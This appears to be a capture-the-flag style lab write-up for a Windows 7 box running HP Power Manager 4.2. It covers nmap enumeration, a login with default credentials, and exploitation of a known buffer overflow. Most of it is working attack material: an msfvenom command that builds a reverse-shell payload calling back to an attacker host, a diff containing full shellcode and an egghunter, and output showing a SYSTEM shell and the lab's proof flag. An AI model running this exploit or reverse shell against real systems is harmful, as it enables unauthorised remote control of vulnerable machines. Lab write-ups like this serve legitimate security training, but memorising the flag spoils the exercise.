# Kevin

## Initial access

Run `autorecon` to enumerate the target:

```
sudo autorecon 192.168.239.45
```

Open ports discovered:

- **80** — HTTP (GoAhead WebServer)
  - Additional webpages:
    - `http://192.168.239.45/goform/formLogin`
    - `http://192.168.239.45/contents/`
    - `http://192.168.239.45/CStyle/`
    - `http://192.168.239.45/nul`
    - `http://192.168.239.45/cgi-bin*`
- **135** — MSRPC (Microsoft Windows RPC)
- **137 (UDP)** — NetBIOS (workgroup: WORKGROUP)
- **139** — NetBIOS (Windows 7 Ultimate N 7600)
- **445** — SMB (Windows 7 Ultimate N 7600, workgroup: WORKGROUP)
  - autorecon detected `smb-vuln-ms17-010` (CVE-2017-0143), risk factor HIGH. This was not confirmed in the follow-up nmap scan.
- **3389** — RDP (Microsoft Terminal Service)
- **3573** — tag-ups-1?
- **49152–49155, 49158, 49160** — MSRPC

A follow-up `nmap` scan with service detection and default scripts confirmed the open ports and refined the version information:

```
nmap -sVC -p- -v -T4 -sT --open 192.168.239.45
...
PORT      STATE SERVICE       VERSION
80/tcp    open  http          GoAhead WebServer
| http-methods:
|_  Supported Methods: GET HEAD
|_http-server-header: GoAhead-Webs
|_http-title: Did not follow redirect to http://192.168.239.45/index.asp
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds  Windows 7 Ultimate N 7600 microsoft-ds (workgroup: WORKGROUP)
3389/tcp  open  ms-wbt-server Microsoft Terminal Service
| rdp-ntlm-info:
|   Target_Name: KEVIN
|   NetBIOS_Domain_Name: KEVIN
|   NetBIOS_Computer_Name: KEVIN
|   DNS_Domain_Name: kevin
|   DNS_Computer_Name: kevin
|   Product_Version: 6.1.7600
|_  System_Time: 2026-11-24T12:32:38+00:00
| ssl-cert: Subject: commonName=kevin
| Issuer: commonName=kevin
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha1WithRSAEncryption
| Not valid before: 2026-11-23T11:51:56
| Not valid after:  2027-05-25T11:51:56
| MD5:     f20a e649 4d48 cb08 b15f ea16 cde7 a85f
| SHA-1:   512c c8a6 db69 de88 f146 88d4 0e28 338e 9cc4 a210
|_SHA-256: 492c ea9e 0cc0 4b57 06bf f49a 4aaf b1d8 c12b 5838 4980 69bf 82ea f61b 697c 9eb4
|_ssl-date: 2026-11-24T12:32:46+00:00; 0s from scanner time.
3573/tcp  open  tag-ups-1?
49152/tcp open  msrpc         Microsoft Windows RPC
49153/tcp open  msrpc         Microsoft Windows RPC
49154/tcp open  msrpc         Microsoft Windows RPC
49155/tcp open  msrpc         Microsoft Windows RPC
49158/tcp open  msrpc         Microsoft Windows RPC
49160/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: KEVIN; OS: Windows; CPE: cpe:/o:microsoft:windows
```

### Web Service Enumeration

Navigating to `http://192.168.239.45` presented an HP Power Manager login page. Attempting default credentials `admin:admin` succeeded.

Within the application, the page at `http://192.168.239.45/contents/` identified the software as **HP Power Manager 4.2 (Build 7)**.

Queried Exploit-DB for known vulnerabilities:

```
searchsploit hp power manager

---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                                                                            |  Path
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Flying Dog Software Powerslave 4.3 Portalmanager - 'sql_id' Information Disclosure                                                                                                                        | php/webapps/23163.txt
 Hewlett-Packard (HP) Power Manager Administration - Remote Buffer Overflow (Metasploit)                                                                                                                   | windows/remote/16785.rb
 Hewlett-Packard (HP) Power Manager Administration Power Manager Administration - Universal Buffer Overflow                                                                                                | windows/remote/10099.py
 HP Power Manager - 'formExportDataLogs' Remote Buffer Overflow (Metasploit)                                                                                                                               | cgi/remote/18015.rb
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
```

The target is vulnerable to a universal buffer overflow (Exploit-DB 10099, CVE-2009-2685). Downloaded the exploit script:

```
searchsploit -m 10099

python2 10099.py 192.168.239.45
HP Power Manager Administration Universal Buffer Overflow Exploit
ryujin __A-T__ offensive-security.com
[+] Sending evil buffer...
HTTP/1.0 200 OK

[+] Done!
[*] Check your shell at 192.168.239.45:4444 , can take up to 1 min to spawn your shell
```

The exploit is designed to create a bind shell on port 4444, but connecting to it failed:

```
penelope -c 192.168.239.45 -p 4444
[-] Connection refused... (192.168.239.45:4444)
```

### Exploit Modification

Searched for a modified version of the exploit and found a GitHub fork adapted for Windows 7 ([HP_Power_Manager_Administration_Universal_Buffer_Overflow.py](https://github.com/fuzzlove/buffer_overflows/blob/master/HP_Power_Manager_Administration_Universal_Buffer_Overflow.py), original tested on Windows 2003/XP). The modified version replaces the default payload with a custom reverse shell generated via `msfvenom`:

```
msfvenom -p windows/shell_reverse_tcp LPORT=443 LHOST=192.168.45.208 EXITFUNC=thread -b '\x00\x1a\x3a\x26\x3f\x25\x23\x20\x0a\x0d\x2f\x2b\x0b\x5' x86/alpha_mixed --platform windows -f python
```

The original exploit (10099.py) was modified with the following changes:

- Replaced the exploit with the one found on GitHub
- Replaced the `SHELL` buffer with the `msfvenom`-generated `buf` variable containing alphanumeric shellcode

The key diff between the original and modified exploit:

```
4c4
< # Tested on Win2k3 Ent SP2 English, Win XP Sp2 English
---
> # Tested on Win2k3 Ent SP2 English, Win XP Sp2 English, Win7 Ultimate N
23a24,25
> # Modified in 2019 for Win7 By JMcPeters
>
39,92c41,78
< # [*] Using Msf::Encoder::PexAlphaNum with final size of 709 bytes
< # badchar = "\x00\x3a\x26\x3f\x25\x23\x20\x0a\x0d\x2f\x2b\x0b\x5c\x3d\x3b\x2d\x2c\x2e\x24\x25\x1a"
< SHELL = (
< "n00bn00b"
< "\xeb\x03\x59\xeb\x05\xe8\xf8\xff\xff\xff\x4f\x49\x49\x49\x49\x49"
< "\x49\x51\x5a\x56\x54\x58\x36\x33\x30\x56\x58\x34\x41\x30\x42\x36"
< "\x48\x48\x30\x42\x33\x30\x42\x43\x56\x58\x32\x42\x44\x42\x48\x34"
< "\x41\x32\x41\x44\x30\x41\x44\x54\x42\x44\x51\x42\x30\x41\x44\x41"
< "\x56\x58\x34\x5a\x38\x42\x44\x4a\x4f\x4d\x4e\x4f\x4c\x36\x4b\x4e"
< "\x4d\x44\x4a\x4e\x49\x4f\x4f\x4f\x4f\x4f\x4f\x4f\x42\x46\x4b\x38"
< "\x4e\x56\x46\x32\x46\x42\x4b\x58\x45\x34\x4e\x33\x4b\x48\x4e\x47"
< "\x45\x30\x4a\x37\x41\x50\x4f\x4e\x4b\x38\x4f\x34\x4a\x51\x4b\x38"
< "\x4f\x35\x42\x32\x41\x50\x4b\x4e\x49\x54\x4b\x48\x46\x33\x4b\x58"
< "\x41\x30\x50\x4e\x41\x43\x42\x4c\x49\x49\x4e\x4a\x46\x58\x42\x4c"
< "\x46\x37\x47\x50\x41\x4c\x4c\x4c\x4d\x30\x41\x50\x44\x4c\x4b\x4e"
< "\x46\x4f\x4b\x53\x46\x55\x46\x32\x4a\x52\x45\x47\x45\x4e\x4b\x58"
< "\x4f\x55\x46\x52\x41\x50\x4b\x4e\x48\x46\x4b\x58\x4e\x50\x4b\x54"
< "\x4b\x58\x4f\x55\x4e\x31\x41\x30\x4b\x4e\x43\x50\x4e\x42\x4b\x48"
< "\x49\x38\x4e\x36\x46\x52\x4e\x31\x41\x46\x43\x4c\x41\x43\x4b\x4d"
< "\x46\x46\x4b\x38\x43\x54\x42\x33\x4b\x38\x42\x54\x4e\x30\x4b\x48"
< "\x42\x37\x4e\x31\x4d\x4a\x4b\x48\x42\x34\x4a\x30\x50\x35\x4a\x46"
< "\x50\x48\x50\x34\x50\x50\x4e\x4e\x42\x45\x4f\x4f\x48\x4d\x48\x56"
< "\x43\x45\x48\x46\x4a\x36\x43\x43\x44\x33\x4a\x46\x47\x47\x43\x57"
< "\x44\x33\x4f\x55\x46\x45\x4f\x4f\x42\x4d\x4a\x56\x4b\x4c\x4d\x4e"
< "\x4e\x4f\x4b\x33\x42\x45\x4f\x4f\x48\x4d\x4f\x55\x49\x38\x45\x4e"
< "\x48\x36\x41\x38\x4d\x4e\x4a\x30\x44\x50\x45\x35\x4c\x56\x44\x50"
< "\x4f\x4f\x42\x4d\x4a\x36\x49\x4d\x49\x50\x45\x4f\x4d\x4a\x47\x35"
< "\x4f\x4f\x48\x4d\x43\x55\x43\x55\x43\x35\x43\x45\x43\x35\x43\x34"
< "\x43\x35\x43\x54\x43\x45\x4f\x4f\x42\x4d\x48\x46\x4a\x46\x41\x41"
< "\x4e\x35\x48\x46\x43\x55\x49\x58\x41\x4e\x45\x39\x4a\x36\x46\x4a"
< "\x4c\x31\x42\x47\x47\x4c\x47\x35\x4f\x4f\x48\x4d\x4c\x46\x42\x51"
< "\x41\x35\x45\x55\x4f\x4f\x42\x4d\x4a\x46\x46\x4a\x4d\x4a\x50\x42"
< "\x49\x4e\x47\x45\x4f\x4f\x48\x4d\x43\x55\x45\x55\x4f\x4f\x42\x4d"
< "\x4a\x56\x45\x4e\x49\x54\x48\x58\x49\x54\x47\x45\x4f\x4f\x48\x4d"
< "\x42\x55\x46\x45\x46\x45\x45\x35\x4f\x4f\x42\x4d\x43\x59\x4a\x46"
< "\x47\x4e\x49\x57\x48\x4c\x49\x47\x47\x55\x4f\x4f\x48\x4d\x45\x35"
< "\x4f\x4f\x42\x4d\x48\x46\x4c\x36\x46\x56\x48\x56\x4a\x46\x43\x36"
< "\x4d\x46\x49\x58\x45\x4e\x4c\x56\x42\x55\x49\x35\x49\x52\x4e\x4c"
< "\x49\x58\x47\x4e\x4c\x56\x46\x54\x49\x38\x44\x4e\x41\x43\x42\x4c"
< "\x43\x4f\x4c\x4a\x50\x4f\x44\x34\x4d\x32\x50\x4f\x44\x34\x4e\x42"
< "\x43\x59\x4d\x38\x4c\x57\x4a\x33\x4b\x4a\x4b\x4a\x4b\x4a\x4a\x56"
< "\x44\x57\x50\x4f\x43\x4b\x48\x51\x4f\x4f\x45\x47\x46\x34\x4f\x4f"
< "\x48\x4d\x4b\x35\x47\x45\x44\x35\x41\x55\x41\x45\x41\x35\x4c\x56"
< "\x41\x30\x41\x55\x41\x45\x45\x35\x41\x35\x4f\x4f\x42\x4d\x4a\x56"
< "\x4d\x4a\x49\x4d\x45\x50\x50\x4c\x43\x35\x4f\x4f\x48\x4d\x4c\x36"
< "\x4f\x4f\x4f\x4f\x47\x43\x4f\x4f\x42\x4d\x4b\x58\x47\x45\x4e\x4f"
< "\x43\x58\x46\x4c\x46\x46\x4f\x4f\x48\x4d\x44\x45\x4f\x4f\x42\x4d"
< "\x4a\x36\x4f\x4e\x50\x4c\x42\x4e\x42\x56\x43\x45\x4f\x4f\x48\x4d"
< "\x4f\x4f\x42\x4d\x5a")
<
< EH ='\x33\xD2\x90\x90\x90\x42\x52\x6a'
< EH +='\x02\x58\xcd\x2e\x3c\x05\x5a\x74'
< EH +='\xf4\xb8\x6e\x30\x30\x62\x8b\xfa'
< EH +='\xaf\x75\xea\xaf\x75\xe7\xff\xe7'
---
> # msfvenom -p windows/shell_reverse_tcp LPORT=443 LHOST=10.11.0.62  EXITFUNC=thread -b '\x00\x1a\x3a\x26\x3f\x25\x23\x20\x0a\x0d\x2f\x2b\x0b\x5' x86/alpha_mixed --platform windows -f python
> buf =  "FuZZFuZZ"
> buf += "\x31\xc9\x83\xe9\xaf\xe8\xff\xff\xff\xc0\x5e"
> buf += "\x81\x76\x0e\xb7\x95\x9f\xb0\x83\xee\xfc\xe2\xf4"
> buf += "\x4b\x7d\x1d\xb0\xb7\x95\xff\x39\x52\xa4\x5f\xd4"
> buf += "\x3c\xc5\xaf\x3b\xe5\x99\x14\xe2\xa3\x1e\xed\x98"
> buf += "\xb8\x22\xd5\x96\x86\x6a\x33\x8c\xd6\xe9\x9d\x9c"
> buf += "\x97\x54\x50\xbd\xb6\x52\x7d\x42\xe5\xc2\x14\xe2"
> buf += "\xa7\x1e\xd5\x8c\x3c\xd9\x8e\xc8\x54\xdd\x9e\x61"
> buf += "\xe6\x1e\xc6\x90\xb6\x46\x14\xf9\xaf\x76\xa5\xf9"
> buf += "\x3c\xa1\x14\xb1\x61\xa4\x60\x1c\x76\x5a\x92\xb1"
> buf += "\x70\xad\x7f\xc5\x41\x96\xe2\x48\x8c\xe8\xbb\xc5"
> buf += "\x53\xcd\x14\xe8\x93\x94\x4c\xd6\x3c\x99\xd4\x3b"
> buf += "\xef\x89\x9e\x63\x3c\x91\x14\xb1\x67\x1c\xdb\x94"
> buf += "\x93\xce\xc4\xd1\xee\xcf\xce\x4f\x57\xca\xc0\xea"
> buf += "\x3c\x87\x74\x3d\xea\xfd\xac\x82\xb7\x95\xf7\xc7"
> buf += "\xc4\xa7\xc0\xe4\xdf\xd9\xe8\x96\xb0\x6a\x4a\x08"
> buf += "\x27\x94\x9f\xb0\x9e\x51\xcb\xe0\xdf\xbc\x1f\xdb"
> buf += "\xb7\x6a\x4a\xe0\xe7\xc5\xcf\xf0\xe7\xd5\xcf\xd8"
> buf += "\x5d\x9a\x40\x50\x48\x40\x08\xda\xb2\xfd\x5f\x18"
> buf += "\x9a\x45\xf7\xb2\xb7\x94\x24\x39\x51\xff\x8f\xe6"
> buf += "\xe0\xfd\x06\x15\xc3\xf4\x60\x65\x32\x55\xeb\xbc"
> buf += "\x48\xdb\x97\xc5\x5b\xfd\x6f\x05\x15\xc3\x60\x65"
> buf += "\xdf\xf6\xf2\xd4\xb7\x1c\x7c\xe7\xe0\xc2\xae\x46"
> buf += "\xdd\x87\xc6\xe6\x55\x68\xf9\x77\xf3\xb1\xa3\xb1"
> buf += "\xb6\x18\xdb\x94\xa7\x53\x9f\xf4\xe3\xc5\xc9\xe6"
> buf += "\xe1\xd3\xc9\xfe\xe1\xc3\xcc\xe6\xdf\xec\x53\x8f"
> buf += "\x31\x6a\x4a\x39\x57\xdb\xc9\xf6\x48\xa5\xf7\xb8"
> buf += "\x30\x88\xff\x4f\x62\x2e\x04\x6b\x86\x65\xf7\x16"
> buf += "\x22\x28\x02\x4f\x62\xa9\x99\xcc\xbd\x15\x64\x50"
> buf += "\xc2\x90\x24\xf7\xa4\xe7\xf0\xda\xb7\xc6\x60\x65"
>
> # /usr/share/metasploit-framework/tools/exploit/egghunter.rb -f python -b '\x00\x3a\x26\x3f\x25\x23\x20\x0a\x0d\x2f\x2b\x0b\x5c&=+?:;-,/#.\\$%\x1a' -e FuZZ -v 'EH'
>
> EH =  ""
> EH += "\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c"
> EH += "\x05\x5a\x74\xef\xb8\x46\x75\x5a\x5a\x89\xd7\xaf\x75"
> EH += "\xea\xaf\x75\xe7\xff\xe7"
107c93
< evil = evil % (HOST,HOST,SHELL,HOST)
---
> evil = evil % (HOST,HOST,buf,HOST)
111c97
< print '[+] Sending evil buffer...'
---
> print '[+] Sending buffer...'
115c101
< print "[*] Check your shell at %s:4444 , can take up to 1 min to spawn your shell" % HOST
---
> print "[*] Reverse shell coming your way... , can take up to 1 min to spawn your shell"
```

Ran the modified exploit and caught the reverse shell with `penelope`:

```
python2 10099_modified.py 192.168.239.45
HP Power Manager Administration Universal Buffer Overflow Exploit
ryujin __A-T__ offensive-security.com
[+] Sending buffer...
HTTP/1.0 200 OK

[+] Done!
[*] Reverse shell coming your way... , can take up to 1 min to spawn your shell

# penelope
C:\Windows\system32>whoami
nt authority\system
```

The HP Power Manager service runs with SYSTEM privileges, so the buffer overflow delivers a shell directly as `nt authority\system` — no privilege escalation is needed.

Retrieved the proof flag:

```
C:\Windows\system32>type C:\Users\Administrator\Desktop\proof.txt
fe05d1855d3431bc3272cecc112264d0
```
